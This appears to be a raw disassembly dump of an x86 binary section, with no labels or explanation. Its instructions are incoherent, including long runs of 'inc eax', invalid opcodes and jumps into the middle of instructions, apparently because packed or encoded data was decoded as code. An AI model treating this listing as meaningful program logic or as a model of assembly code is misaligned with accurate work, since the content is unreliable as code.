  404b0a:	inc    eax
  404b0b:	adc    eax,0x21194774
  404b10:	mov    al,0xd
  404b12:	(bad)  
  404b14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b15:	fimul  WORD PTR [esi+esi*1]
  404b18:	adc    eax,0x404c53ca
  404b1d:	inc    eax
  404b1e:	inc    eax
  404b1f:	inc    eax
  404b20:	inc    eax
  404b21:	inc    eax
  404b22:	inc    eax
  404b23:	inc    eax
  404b24:	inc    eax
  404b25:	inc    eax
  404b26:	je     0x404b5e
  404b28:	sti    
  404b29:	retf   
  404b2a:	retf   
  404b2b:	inc    ebp
  404b2c:	pushf  
  404b2d:	mov    dl,BYTE PTR ss:[edx+0x40]
  404b31:	loop   0x404b6b
  404b33:	inc    edx
  404b34:	adc    eax,0x50517481
  404b39:	cmc    
  404b3a:	xor    eax,0xed7bcbe0
  404b3f:	inc    ecx
  404b40:	ja     0x404b82
  404b42:	inc    eax
  404b43:	inc    eax
  404b44:	inc    eax
  404b45:	inc    eax
  404b46:	inc    eax
  404b47:	int3   
  404b48:	jne    0x404b8a
  404b4a:	bound  eax,QWORD PTR [ecx+eax*2-0x64]
  404b4e:	inc    ecx
  404b4f:	je     0x404b8a
  404b51:	or     al,0x28
  404b53:	mov    eax,0xd0814110
  404b58:	cmp    cl,0x34
  404b5b:	cmp    eax,0x74c3bec8
  404b60:	adc    eax,0x406ad0
  404b65:	rol    DWORD PTR [eax+0x40],0x40
  404b69:	inc    eax
  404b6a:	add    BYTE PTR [eax-0x3d],al
  404b6d:	push   ecx
  404b6e:	fsubr  QWORD PTR [eax-0x17c0f2cd]
  404b74:	ds inc ecx
  404b76:	push   ebx
  404b77:	or     eax,0x520ef274
  404b7c:	xor    al,0x42
  404b7e:	test   al,0xcb
  404b80:	push   ss
  404b81:	das    
  404b82:	push   ebp
  404b83:	in     eax,0x4d
  404b85:	test   BYTE PTR ds:0x40404044,al
  404b8b:	inc    eax
  404b8c:	inc    eax
  404b8d:	inc    eax
  404b8e:	inc    eax
  404b8f:	inc    eax
  404b90:	inc    DWORD PTR [eax+0x74]
  404b93:	jl     0x404b8c
  404b95:	mov    WORD PTR [eax+0x44],es
  404b98:	xor    cl,BYTE PTR [edi+0x79]
  404b9b:	push   edi
  404b9c:	inc    ebp
  404b9d:	dec    ebp
  404b9e:	mov    eax,gs
  404ba0:	xchg   edx,eax
  404ba1:	inc    ebp
  404ba2:	je     0x404b35
  404ba4:	xlat   BYTE PTR ds:[ebx]
  404ba5:	mov    BYTE PTR [ebx-0x41],ch
  404ba8:	bound  edi,QWORD PTR [esp+ebx*2]
  404bab:	inc    ebp
  404bac:	(bad)  
  404bad:	push   0xc08b1502
  404bb2:	jae    0x404b68
  404bb4:	fild   WORD PTR [ecx+0x404040a8]
  404bba:	inc    eax
  404bbb:	inc    eax
  404bbc:	inc    eax
  404bbd:	inc    eax
  404bbe:	inc    eax
  404bbf:	inc    eax
  404bc0:	inc    eax
  404bc1:	enter  0x68bc,0xbf
  404bc5:	bound  eax,QWORD PTR [edi]
  404bc7:	inc    edx
  404bc8:	in     eax,dx
  404bc9:	inc    ecx
  404bca:	inc    ebp
  404bcb:	inc    ecx
  404bcc:	jae    0x404c10
  404bce:	nop
  404bcf:	ficom  WORD PTR cs:[ecx]
  404bd2:	push   ebp
  404bd3:	jp     0x404b77
  404bd5:	xor    BYTE PTR [ecx+0x52],bh
  404bd8:	inc    eax
  404bd9:	inc    eax
  404bda:	inc    eax
  404bdb:	inc    eax
  404bdc:	inc    eax
  404bdd:	inc    eax
  404bde:	inc    eax
  404bdf:	inc    eax
  404be0:	add    BYTE PTR [eax+0x7369beca],cl
  404be6:	ja     0x404c28
  404be8:	stos   BYTE PTR es:[edi],al
  404be9:	adc    eax,0x8568cc43
  404bee:	inc    eax
  404bef:	ja     0x404bf6
  404bf1:	int    0x74
  404bf3:	push   edx
  404bf4:	xor    al,0x73
  404bf6:	add    eax,edi
  404bf8:	xchg   BYTE PTR [eax+eiz*8+0x15],al
  404bfc:	inc    eax
  404bfd:	call   0x4080652a
  404c02:	inc    eax
  404c03:	inc    eax
  404c04:	inc    eax
  404c05:	inc    eax
  404c06:	and    eax,0x24404040
  404c0b:	sub    ch,BYTE PTR [eax+0x72]
  404c0e:	xchg   esp,eax
  404c0f:	jae    0x404c53
  404c11:	or     ebp,DWORD PTR [ecx+0x3da83c42]
  404c17:	retf   
  404c18:	adc    BYTE PTR [ecx+0x5],bh
  404c1b:	inc    edi
  404c1c:	mov    BYTE PTR [esi-0x5cfe8c3d],bl
  404c22:	xchg   ah,ch
  404c24:	jnp    0x404c88
  404c26:	xchg   esp,eax
  404c27:	cs inc edi
  404c29:	or     esp,DWORD PTR [ebp-0x12]
  404c2c:	inc    ecx
  404c2d:	mov    eax,ds:0x40407315
  404c32:	inc    eax
  404c33:	inc    eax
  404c34:	inc    eax
  404c35:	inc    eax
  404c36:	inc    eax
  404c37:	inc    eax
  404c38:	inc    eax
  404c39:	inc    eax
  404c3a:	jo     0x404cbb
  404c3c:	test   al,0xac
  404c3e:	add    ch,BYTE PTR [ecx+0xb7511c9]
  404c44:	add    eax,0x41bffe62
  404c49:	jae    0x404c8b
  404c4b:	jg     0x404bd3
  404c4d:	lds    ecx,FWORD PTR [edi+0x35]
  404c50:	dec    eax
  404c51:	je     0x404cb6
  404c53:	inc    esp
  404c54:	jge    0x404ca5
  404c56:	mov    eax,0x4073147b
  404c5b:	lahf   
  404c5c:	inc    eax
  404c5d:	inc    eax
  404c5e:	inc    eax
  404c5f:	inc    eax
  404c60:	inc    eax
  404c61:	inc    eax
  404c62:	rol    DWORD PTR [eax+0x40],0xa7
  404c66:	dec    esp
  404c67:	adc    eax,0x7a57cd62
  404c6c:	or     eax,0x35430205
  404c71:	test   al,0x72
  404c73:	loopne 0x404cab
  404c75:	xchg   BYTE PTR [ebx-0x4c],bh
  404c78:	test   al,0xd
  404c7a:	mov    edx,0xb82c7a54
  404c7f:	inc    eax
  404c80:	inc    eax
  404c81:	add    BYTE PTR [eax+0x40],al
  404c84:	inc    eax
  404c85:	inc    eax
  404c86:	inc    eax
  404c87:	inc    eax
  404c88:	adc    eax,0xff72cb39
  404c8d:	push   cs
  404c8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c8f:	add    eax,0x9d4dc8cb
  404c94:	dec    esp
  404c95:	je     0x404c9c
  404c97:	inc    esp
  404c98:	dec    eax
  404c99:	pop    eax
  404c9a:	inc    edx
  404c9b:	jb     0x404cf1
  404c9d:	adc    al,0x86
  404c9f:	mov    ds:0x809862fe,eax
  404ca4:	gs and eax,0x4040402c
  404caa:	inc    eax
  404cab:	inc    eax
  404cac:	inc    eax
  404cad:	inc    eax
  404cae:	inc    eax
  404caf:	inc    eax
  404cb0:	inc    eax
  404cb1:	xor    al,0x4f
  404cb3:	fs or  eax,0xa5714472
  404cb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cba:	mov    eax,0xd1e3cb4f
  404cbf:	mov    ch,0x5
  404cc1:	loopne 0x404cc8
  404cc3:	std    
  404cc4:	inc    eax
  404cc5:	inc    eax
  404cc6:	inc    eax
  404cc7:	inc    eax
  404cc8:	inc    eax
  404cc9:	inc    eax
  404cca:	int3   
  404ccb:	jne    0x404d0d
  404ccd:	add    DWORD PTR [edx+0x4d],esi
  404cd0:	inc    ecx
  404cd1:	xchg   BYTE PTR [edx+0x43],ah
  404cd4:	pop    edi
  404cd5:	xor    eax,0x2171dcc6
  404cda:	push   0x728cb8b4
  404cdf:	bound  ecx,QWORD PTR [ebx-0x5c]
  404ce2:	or     BYTE PTR ds:0x4029056b,al
  404ce8:	push   eax
  404ce9:	add    eax,0x7b95cb63
  404cee:	jb     0x404d30
  404cf0:	add    cl,al
  404cf2:	inc    eax
  404cf3:	inc    eax
  404cf4:	inc    eax
  404cf5:	inc    eax
  404cf6:	add    BYTE PTR [eax+0x7d],al
  404cf9:	push   cs
  404cfa:	xchg   dh,al
  404cfc:	or     bh,ah
  404cfe:	dec    eax
  404cff:	or     al,0x98
  404d01:	jg     0x404d4c
  404d03:	fdiv   QWORD PTR [ebx]
  404d05:	arpl   WORD PTR [ebp+0x72],ax
  404d08:	inc    ecx
  404d09:	jno    0x404d4b
  404d0b:	enter  0xdb0,0x50
  404d0f:	outs   dx,DWORD PTR ds:[esi]
  404d10:	cmc    
  404d11:	or     al,0x7e
  404d13:	inc    ebp
  404d14:	inc    eax
  404d15:	inc    eax
  404d16:	inc    eax
  404d17:	inc    eax
  404d18:	inc    eax
  404d19:	inc    eax
  404d1a:	inc    eax
  404d1b:	inc    eax
  404d1c:	inc    DWORD PTR [eax+0x15]
  404d1f:	retf   
  404d20:	xor    al,0x72
  404d22:	pusha  
  404d23:	shl    esp,1
  404d25:	xor    eax,0x525b4c7b
  404d2a:	push   ecx
  404d2b:	pop    esp
  404d2c:	ja     0x404d64
  404d2e:	mov    eax,0x41713805
  404d33:	xor    BYTE PTR [edi-0x58],al
  404d36:	adc    eax,0x70b54141
  404d3b:	adc    al,0x15
  404d3d:	adc    bl,cl
  404d3f:	gs jbe 0x404db3
  404d42:	inc    eax
  404d43:	inc    eax
  404d44:	inc    eax
  404d45:	inc    eax
  404d46:	inc    eax
  404d47:	inc    eax
  404d48:	inc    eax
  404d49:	inc    eax
  404d4a:	inc    eax
  404d4b:	inc    eax
  404d4c:	and    al,0x4c
  404d4e:	ins    DWORD PTR es:[edi],dx
  404d4f:	mov    ah,0x4d
  404d51:	in     al,dx
  404d52:	addr16 cwde 
  404d54:	dec    ecx
  404d55:	jb     0x404d9a
  404d57:	inc    ecx
  404d58:	inc    eax
  404d59:	bound  ebp,QWORD PTR [ecx+0x19d5271]
  404d5f:	ja     0x404dd6
  404d61:	dec    esp
  404d62:	int3   
  404d63:	sti    
  404d64:	inc    eax
  404d65:	inc    eax
  404d66:	inc    eax
  404d67:	inc    eax
  404d68:	inc    eax
  404d69:	inc    eax
  404d6a:	inc    eax
  404d6b:	inc    eax
  404d6c:	add    BYTE PTR [eax+edx*1+0x31],bh
  404d70:	and    al,0x90
  404d72:	addr16 retf 
  404d74:	jno    0x404dca
  404d76:	and    esp,DWORD PTR [esi+0x64]
  404d79:	mov    al,0xd9
  404d7b:	sbb    al,0xde
  404d7d:	mov    ebp,0xd7a6030
  404d82:	bound  esi,QWORD PTR [ecx+esi*2]
  404d85:	push   esi
  404d86:	or     ecx,ecx
  404d88:	inc    eax
  404d89:	inc    eax
  404d8a:	inc    eax
  404d8b:	inc    eax
  404d8c:	inc    eax
  404d8d:	inc    eax
  404d8e:	and    eax,0xb8404040
  404d93:	leave  
  404d94:	add    BYTE PTR [edi+0x4a1351c1],bh
  404d9a:	push   edx
  404d9b:	inc    ecx
  404d9c:	sub    al,BYTE PTR [ecx+0x71]
  404d9f:	stos   DWORD PTR es:[edi],eax
  404da0:	pop    edx
  404da1:	xor    al,0x4c
  404da3:	test   eax,0x4424b22d
  404da8:	inc    ecx
  404da9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404daa:	add    al,bl
  404dac:	push   edx
  404dad:	js     0x404e20
  404daf:	mov    bh,0x7f
  404db1:	out    0xcb,eax
  404db3:	mov    al,0x3d
  404db5:	fs pop es
  404db7:	inc    eax
  404db8:	add    eax,0x40404040
  404dbd:	inc    eax
  404dbe:	inc    eax
  404dbf:	inc    eax
  404dc0:	inc    eax
  404dc1:	inc    eax
  404dc2:	inc    eax
  404dc3:	inc    edi
  404dc4:	dec    esp
  404dc5:	or     eax,0x547148c1
  404dca:	pop    edi
  404dcb:	push   ss
  404dcc:	inc    ecx
  404dcd:	retf   
  404dce:	dec    ecx
  404dcf:	popa   
  404dd0:	push   0x70
  404dd2:	add    eax,0x3424576a
  404dd7:	or     DWORD PTR [ecx+0x40],esi
  404dda:	pop    edi
  404ddb:	sub    BYTE PTR [eax],0x36
  404dde:	inc    ecx
  404ddf:	arpl   WORD PTR [ebp+0x50],cx
  404de2:	(bad)  
  404de3:	outs   dx,DWORD PTR ds:[esi]
  404de4:	mov    BYTE PTR [eax+0x40],0x40
  404de8:	inc    eax
  404de9:	inc    eax
  404dea:	inc    eax
  404deb:	rol    DWORD PTR [eax+0x40],0x40
  404def:	out    0x97,al
  404df1:	jo     0x404e6b
  404df3:	fist   WORD PTR [ecx-0x57f34fdc]
  404df9:	mov    al,0x44
  404dfb:	pop    ds
  404dfc:	inc    eax
  404dfd:	inc    eax
  404dfe:	add    BYTE PTR [eax+0x40],al
  404e01:	inc    eax
  404e02:	inc    eax
  404e03:	inc    eax
  404e04:	inc    eax
  404e05:	adc    dh,dh
  404e07:	cmp    eax,0xf9701263
  404e0c:	and    eax,0x58c3fc47
  404e11:	rcl    DWORD PTR [ebx+0x41154e45],0xb0
  404e18:	xor    al,0x54
  404e1a:	jo     0x404df4
  404e1c:	push   ecx
  404e1d:	addr16 inc edi
  404e1f:	add    eax,0x71f6cb44
  404e24:	jecxz  0x404e6a
  404e26:	inc    eax
  404e27:	inc    eax
  404e28:	inc    eax
  404e29:	inc    eax
  404e2a:	inc    eax
  404e2b:	inc    eax
  404e2c:	inc    eax
  404e2d:	inc    eax
  404e2e:	inc    eax
  404e2f:	inc    eax
  404e30:	or     ecx,0x9670b410
  404e36:	sbb    eax,edx
  404e38:	lods   al,BYTE PTR ds:[si]
  404e3a:	inc    ebx
  404e3b:	inc    esp
  404e3c:	(bad)  [ecx+0x40]
  404e3f:	gs inc esp
  404e41:	inc    ecx
  404e42:	ds mov al,0x70
  404e45:	rol    DWORD PTR [eax+0x40],1
  404e48:	inc    eax
  404e49:	inc    eax
  404e4a:	inc    eax
  404e4b:	inc    eax
  404e4c:	int3   
  404e4d:	jne    0x404e8f
  404e4f:	xor    DWORD PTR [esp+edi*1],ebx
  404e52:	inc    eax
  404e53:	adc    eax,0xc85c3cd0
  404e58:	test   al,0xe4
  404e5a:	aad    0xa8
  404e5c:	arpl   WORD PTR [eax-0x30],si
  404e5f:	pop    ss
  404e60:	je     0x404e12
  404e62:	inc    eax
  404e63:	add    cl,al
  404e65:	inc    eax
  404e66:	inc    eax
  404e67:	inc    eax
  404e68:	inc    eax
  404e69:	add    BYTE PTR [eax-0x18],al
  404e6c:	pop    edx
  404e6d:	pusha  
  404e6e:	pop    ds
  404e6f:	sub    DWORD PTR [edx],esi
  404e71:	sub    bl,BYTE PTR [ebp+0x702a3254]
  404e77:	dec    ecx
  404e78:	mov    edi,0x112c6242
  404e7d:	cmp    DWORD PTR [edx],eax
  404e7f:	icebp  
  404e80:	ins    DWORD PTR es:[edi],dx
  404e81:	inc    eax
  404e82:	inc    eax
  404e83:	inc    eax
  404e84:	inc    eax
  404e85:	inc    eax
  404e86:	inc    eax
  404e87:	inc    eax
  404e88:	inc    eax
  404e89:	inc    DWORD PTR [eax+0x69]
  404e8c:	retf   
  404e8d:	ins    BYTE PTR es:[edi],dx
  404e8e:	lods   al,BYTE PTR ds:[esi]
  404e8f:	stos   DWORD PTR es:[edi],eax
  404e90:	jo     0x404ee9
  404e92:	std    
  404e93:	mov    BYTE PTR [eax-0x58],al
  404e96:	in     al,0x40
  404e98:	gs xchg ecx,eax
  404e9a:	xor    eax,DWORD PTR [eax+0x40]
  404e9d:	inc    eax
  404e9e:	inc    eax
  404e9f:	inc    eax
  404ea0:	inc    eax
  404ea1:	inc    eax
  404ea2:	inc    eax
  404ea3:	inc    eax
  404ea4:	inc    eax
  404ea5:	pop    esp
  404ea6:	sbb    al,0x11
  404ea8:	sub    al,BYTE PTR [edx+0x70]
  404eab:	jo     0x404e3e
  404ead:	test   edx,edx
  404eaf:	mov    ah,0x64
  404eb1:	pop    ebp
  404eb2:	dec    eax
  404eb3:	push   ecx
  404eb4:	aas    
  404eb5:	frstor [edi]
  404eb7:	inc    ecx
  404eb8:	imul   eax,DWORD PTR [eax+0x40],0x40
  404ebc:	inc    eax
  404ebd:	inc    eax
  404ebe:	inc    eax
  404ebf:	inc    eax
  404ec0:	inc    eax
  404ec1:	add    BYTE PTR [eax],ah
  404ec3:	inc    eax
  404ec4:	dec    esp
  404ec5:	inc    esi
  404ec6:	sub    ebx,esp
  404ec8:	ret    
  404ec9:	cwde   
  404eca:	add    al,BYTE PTR [eax+0x13]
  404ecd:	rol    BYTE PTR [ecx+ebp*2],cl
  404ed0:	adc    BYTE PTR [edx+0x74504087],0x6b
  404ed7:	fsubr  QWORD PTR [edi+edi*4+0x4040e048]
  404ede:	inc    eax
  404edf:	inc    eax
  404ee0:	inc    eax
  404ee1:	inc    eax
  404ee2:	and    eax,0x91404040
  404ee7:	inc    eax
  404ee8:	inc    ebx
  404ee9:	inc    edx
  404eea:	adc    eax,0x9f4015eb
  404eef:	push   ecx
  404ef0:	in     al,dx
  404ef1:	lds    eax,FWORD PTR [esi+0x40]
  404ef4:	inc    eax
  404ef5:	inc    eax
  404ef6:	inc    eax
  404ef7:	inc    eax
  404ef8:	inc    eax
  404ef9:	inc    eax
  404efa:	inc    eax
  404efb:	inc    eax
  404efc:	inc    eax
  404efd:	sahf   
  404efe:	retf   
  404eff:	inc    eax
  404f00:	dec    esp
  404f01:	inc    esi
  404f02:	in     eax,dx
  404f03:	dec    edi
  404f04:	es push edx
  404f06:	inc    edx
  404f07:	jo     0x404f84
  404f09:	fild   WORD PTR [ecx+0x7d]
  404f0c:	aad    0xd0
  404f0e:	mov    ebp,0xa87f5640
  404f13:	push   ebx
  404f14:	les    ecx,FWORD PTR [eax+0x44]
  404f17:	inc    eax
  404f18:	push   ecx
  404f19:	icebp  
  404f1a:	adc    BYTE PTR [edx+0x4f],ah
  404f1d:	sub    eax,0xb464063
  404f22:	inc    ecx
  404f23:	inc    eax
  404f24:	inc    eax
  404f25:	inc    eax
  404f26:	inc    eax
  404f27:	inc    eax
  404f28:	inc    eax
  404f29:	rol    DWORD PTR [eax+0x40],0x91
  404f2d:	inc    eax
  404f2e:	xor    eax,0xb3517f60
  404f33:	xor    eax,0xdccfb462
  404f38:	stos   DWORD PTR es:[edi],eax
  404f39:	dec    esp
  404f3a:	add    BYTE PTR [eax],dh
  404f3c:	std    
  404f3d:	inc    edx
  404f3e:	add    DWORD PTR [esi+0x7f],edx
  404f41:	sbb    DWORD PTR [edi+0x62],edi
  404f44:	arpl   WORD PTR [edi+0x62],ax
  404f47:	xor    eax,0x6a61438e
  404f4c:	inc    eax
  404f4d:	inc    eax
  404f4e:	add    BYTE PTR [eax+0x40],al
  404f51:	inc    eax
  404f52:	inc    eax
  404f53:	inc    eax
  404f54:	inc    eax
  404f55:	enter  0xcdec,0x90
  404f59:	jg     0x404ef6
  404f5b:	shr    DWORD PTR [ebx+ecx*8],1
  404f5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f5f:	retf   0xf105
  404f62:	inc    ecx
  404f63:	jmp    FWORD PTR [eax+0x7b3d05bf]
  404f69:	jg     0x404f41
  404f6b:	pop    eax
  404f6c:	sbb    eax,0x441c87be
  404f71:	aam    0x73
  404f73:	mov    cl,0x3b
  404f75:	mov    edi,0x404040b4
  404f7a:	inc    eax
  404f7b:	inc    eax
  404f7c:	inc    eax
  404f7d:	inc    eax
  404f7e:	inc    eax
  404f7f:	inc    eax
  404f80:	inc    eax
  404f81:	push   ss
  404f82:	inc    ebx
  404f83:	jg     0x404fc6
  404f85:	dec    eax
  404f86:	jle    0x404f14
  404f88:	inc    ecx
  404f89:	or     DWORD PTR [edi+esi*1-0x30],ebp
  404f8d:	xchg   ecx,eax
  404f8e:	arpl   WORD PTR [eax+0x408c5257],bp
  404f94:	inc    eax
  404f95:	inc    eax
  404f96:	inc    eax
  404f97:	inc    eax
  404f98:	inc    eax
  404f99:	int3   
  404f9a:	jne    0x404fdc
  404f9c:	jg     0x404f5b
  404f9e:	dec    ebx
  404f9f:	sbb    DWORD PTR [eax],edx
  404fa1:	xchg   esp,eax
  404fa2:	inc    ebp
  404fa3:	arpl   WORD PTR [edx],bx
  404fa5:	daa    
  404fa6:	mov    bl,0x30
  404fa8:	hlt    
  404fa9:	repz inc edi
  404fab:	xchg   BYTE PTR [edi-0x21],bh
  404fae:	ins    BYTE PTR es:[edi],dx
  404faf:	inc    esp
  404fb0:	add    eax,0x7da87d24
  404fb5:	hlt    
  404fb6:	jg     0x404ff8
  404fb8:	add    cl,al
  404fba:	inc    eax
  404fbb:	inc    eax
  404fbc:	inc    eax
  404fbd:	inc    eax
  404fbe:	add    BYTE PTR [eax+0x53],al
  404fc1:	retf   
  404fc2:	test   al,0x69
  404fc4:	adc    BYTE PTR [edi+0x24],bh
  404fc7:	inc    esp
  404fc8:	xor    DWORD PTR [eax+0x11],ecx
  404fcb:	jbe    0x404f97
  404fcd:	pusha  
  404fce:	popa   
  404fcf:	adc    ecx,DWORD PTR [edi+0x44104168]
  404fd5:	jg     0x405028
  404fd7:	daa    
  404fd8:	sub    eax,0x406281c4
  404fdd:	inc    eax
  404fde:	inc    eax
  404fdf:	inc    eax
  404fe0:	inc    eax
  404fe1:	inc    eax
  404fe2:	inc    eax
  404fe3:	inc    eax
  404fe4:	inc    DWORD PTR [eax-0x35]
  404fe7:	inc    ebx
  404fe8:	inc    edx
  404fe9:	jb     0x405014
  404feb:	sub    al,0xc3
  404fed:	call   0x39b1cea6
  404ff2:	push   esi
  404ff3:	clc    
  404ff4:	inc    esp
  404ff5:	sbb    BYTE PTR ds:0x637b32a6,dl
  404ffb:	not    DWORD PTR [edi+0x62]
  404ffe:	retf   
  404fff:	jle    0x404fb1
  405001:	adc    BYTE PTR [edx+edx*1+0x40],cl
  405005:	inc    eax
  405006:	inc    eax
  405007:	inc    eax
  405008:	inc    eax
  405009:	inc    eax
  40500a:	inc    eax
  40500b:	inc    eax
  40500c:	inc    eax
  40500d:	inc    eax
  40500e:	call   0x30ca0844
  405013:	mov    ebp,0xfcb56335
  405018:	inc    edi
  405019:	jle    0x405028
  40501b:	inc    eax
  40501c:	inc    eax
  40501d:	inc    eax
  40501e:	inc    eax
  40501f:	inc    eax
  405020:	inc    eax
  405021:	inc    eax
  405022:	inc    eax
  405023:	add    BYTE PTR [eax-0x13],ah
  405026:	jne    0x405018
  405028:	sbb    BYTE PTR [ebx],0xec
  40502b:	adc    BYTE PTR [edx],al
  40502d:	shl    BYTE PTR [esi+eiz*1],cl
  405030:	clc    
  405031:	int3   
  405032:	jle    0x405051
  405034:	xor    DWORD PTR [edx+0x63],esp
  405037:	test   al,0x6f
  405039:	jmp    0x40500a
  40503b:	jp     0x40507d
  40503d:	xor    DWORD PTR ds:[eax],edx
  405040:	in     al,0x40
  405042:	inc    eax
  405043:	inc    eax
  405044:	inc    eax
  405045:	inc    eax
  405046:	inc    eax
  405047:	and    eax,0xc3404040
  40504c:	jle    0x405092
  40504e:	push   ecx
  40504f:	lods   al,BYTE PTR ds:[esi]
  405050:	xor    BYTE PTR [eax+0x58],cl
  405053:	dec    edi
  405054:	xor    dl,al
  405056:	dec    ebx
  405057:	arpl   WORD PTR [eax+0x40],ax
  40505a:	inc    eax
  40505b:	inc    eax
  40505c:	inc    eax
  40505d:	inc    eax
  40505e:	inc    eax
  40505f:	inc    eax
  405060:	inc    eax
  405061:	inc    eax
  405062:	mov    WORD PTR [ecx+0x64],es
  405065:	pushf  
  405066:	jle    0x40509c
  405068:	aas    
  405069:	sbb    cl,BYTE PTR ds:0x15054256
  40506f:	inc    ecx
  405070:	add    al,ch
  405072:	jnp    0x405040
  405074:	cmp    al,0x40
  405076:	inc    eax
  405077:	inc    eax
  405078:	inc    eax
  405079:	inc    eax
  40507a:	inc    eax
  40507b:	rol    DWORD PTR [eax+0x40],0x7b
  40507f:	jle    0x4050b2
  405081:	icebp  
  405082:	push   esp
  405083:	mov    al,0x8a
  405085:	stc    
  405086:	mov    eax,0xf3454478
  40508b:	or     eax,0x7e05e4a9
  405090:	jo     0x405069
  405092:	fmul   st(3),st
  405094:	test   al,0x59
  405096:	retf   
  405097:	pop    ebx
  405098:	inc    edx
  405099:	outs   dx,DWORD PTR ds:[esi]
  40509a:	bound  edi,QWORD PTR [edi+0x7db86505]
  4050a0:	aas    
  4050a1:	mov    cl,0x4f
  4050a3:	mov    edi,0x4040cb
  4050a8:	inc    eax
  4050a9:	inc    eax
  4050aa:	inc    eax
  4050ab:	inc    eax
  4050ac:	inc    eax
  4050ad:	inc    eax
  4050ae:	adc    eax,0x4524be47
  4050b3:	es mov esi,0x7d34b248
  4050b9:	pop    ebx
  4050ba:	xor    DWORD PTR [ecx-0x371bbc45],esi
  4050c0:	mov    eax,ds:0xc5623f11
  4050c5:	push   edx
  4050c6:	pop    edx
  4050c7:	mov    eax,0x40441d7d
  4050cc:	inc    eax
  4050cd:	inc    eax
  4050ce:	inc    eax
  4050cf:	inc    eax
  4050d0:	inc    eax
  4050d1:	inc    eax
  4050d2:	inc    eax
  4050d3:	inc    eax
  4050d4:	inc    eax
  4050d5:	or     ecx,DWORD PTR [edi+0x3c]
  4050d8:	bound  ebp,QWORD PTR [edi-0x330eaa7c]
  4050de:	mov    WORD PTR [ebp-0x64],gs
  4050e1:	in     eax,0x7d
  4050e3:	xchg   edx,eax
  4050e4:	iret   
  4050e5:	adc    al,BYTE PTR ds:0x4040e7a8
  4050eb:	inc    eax
  4050ec:	inc    eax
  4050ed:	inc    eax
  4050ee:	inc    eax
  4050ef:	int3   
  4050f0:	jne    0x405132
  4050f2:	(bad)  
  4050f3:	out    0x7a,eax
  4050f5:	repz test al,0x7b
  4050f8:	add    eax,0x477d6e7d
  4050fd:	imul   edx,DWORD PTR [eax],0xac6387b0
  405103:	retf   0x5538
  405106:	inc    esp
  405107:	dec    ebp
  405108:	pop    esp
  405109:	inc    ecx
  40510a:	arpl   WORD PTR [ebp+0x6d],di
  40510d:	and    ecx,DWORD PTR [edx+0x7a]
  405110:	inc    eax
  405111:	add    cl,al
  405113:	inc    eax
  405114:	inc    eax
  405115:	inc    eax
  405116:	inc    eax
  405117:	add    BYTE PTR [eax+0x41],al
  40511a:	xor    BYTE PTR [ecx+0x2d],cl
  40511d:	push   esp
  40511e:	adc    eax,DWORD PTR [eax+eax*1]
  405121:	pusha  
  405122:	xchg   ecx,eax
  405123:	fdivr  DWORD PTR [ebp-0x4f]
  405126:	rol    BYTE PTR [ebx+0x62],0x7c
  40512a:	test   al,0x43
  40512c:	adc    dl,bl
  40512e:	push   ecx
  40512f:	inc    BYTE PTR [edx+0x64]
  405132:	adc    BYTE PTR [edi+0x40],ah
  405135:	inc    eax
  405136:	inc    eax
  405137:	inc    eax
  405138:	inc    eax
  405139:	inc    eax
  40513a:	inc    eax
  40513b:	inc    eax
  40513c:	inc    DWORD PTR [eax+0x7d]
  40513f:	mov    ah,0x5c
  405141:	mov    ah,0x34
  405143:	mov    WORD PTR [eax+0x772273cd],?
  405149:	push   edx
  40514a:	inc    eax
  40514b:	push   eax
  40514c:	inc    ecx
  40514d:	pop    esi
  40514e:	jge    0x405193
  405150:	dec    ecx
  405151:	inc    edx
  405152:	clc    
  405153:	jne    0x405147
  405155:	xor    al,0x56
  405157:	xor    DWORD PTR [ebx],ebx
  405159:	mov    eax,ds:0x40404041
  40515e:	inc    eax
  40515f:	inc    eax
  405160:	inc    eax
  405161:	inc    eax
  405162:	inc    eax
  405163:	inc    eax
  405164:	inc    eax
  405165:	jae    0x40510b
  405167:	sar    DWORD PTR [ebp+ebp*8-0x31],1
  40516b:	sub    DWORD PTR [eax-0x54],0x4db91e63
  405172:	cmp    DWORD PTR [eax+ebx*1+0xd],eax
  405176:	retf   
  405177:	pop    esi
  405178:	jl     0x4051ba
  40517a:	inc    eax
  40517b:	inc    eax
  40517c:	inc    eax
  40517d:	inc    eax
  40517e:	inc    eax
  40517f:	inc    eax
  405180:	inc    eax
  405181:	add    cl,dl
  405183:	mov    edi,0xbfcb63cf
  405188:	xchg   esi,eax
  405189:	pushf  
  40518a:	in     al,0x23
  40518c:	adc    ah,bh
  40518e:	push   esp
  40518f:	mov    edi,0x51b17c01
  405194:	dec    eax
  405195:	cmp    eax,0xffcbcb05
  40519a:	jle    0x4051fb
  40519c:	adc    eax,DWORD PTR [eax+0x40]
  40519f:	inc    eax
  4051a0:	inc    eax
  4051a1:	inc    eax
  4051a2:	inc    eax
  4051a3:	and    eax,0xc3404040
  4051a8:	retf   
  4051a9:	sahf   
  4051aa:	inc    eax
  4051ab:	jl     0x40521d
  4051ad:	icebp  
  4051ae:	test   BYTE PTR [eax+0x51],0x42
  4051b2:	mov    ds:0x73217ae2,al
  4051b7:	inc    ecx
  4051b8:	leave  
  4051b9:	inc    edi
  4051ba:	cmp    DWORD PTR [esp+esi*2-0x4d],0x40401440
  4051c2:	inc    eax
  4051c3:	inc    eax
  4051c4:	inc    eax
  4051c5:	inc    eax
  4051c6:	inc    eax
  4051c7:	inc    eax
  4051c8:	inc    eax
  4051c9:	inc    eax
  4051ca:	mov    eax,0x91c542dc
  4051cf:	shl    ch,0x30
  4051d2:	inc    esi
  4051d3:	std    
  4051d4:	scas   al,BYTE PTR es:[edi]
  4051d5:	jl     0x405225
  4051d7:	icebp  
  4051d8:	addr16 add eax,0x2868b410
  4051de:	xchg   ecx,eax
  4051df:	push   edi
  4051e0:	(bad)  
  4051e1:	xchg   esp,ecx
  4051e3:	arpl   WORD PTR [eax+0x40],ax
  4051e6:	inc    eax
  4051e7:	inc    eax
  4051e8:	inc    eax
  4051e9:	inc    eax
  4051ea:	rol    DWORD PTR [eax+0x40],0x63
  4051ee:	jl     0x405232
  4051f0:	mov    ebx,0xf3ff8840
  4051f5:	pusha  
  4051f6:	or     edx,edx
  4051f8:	push   esi
  4051f9:	in     eax,0x15
  4051fb:	stos   DWORD PTR es:[edi],eax
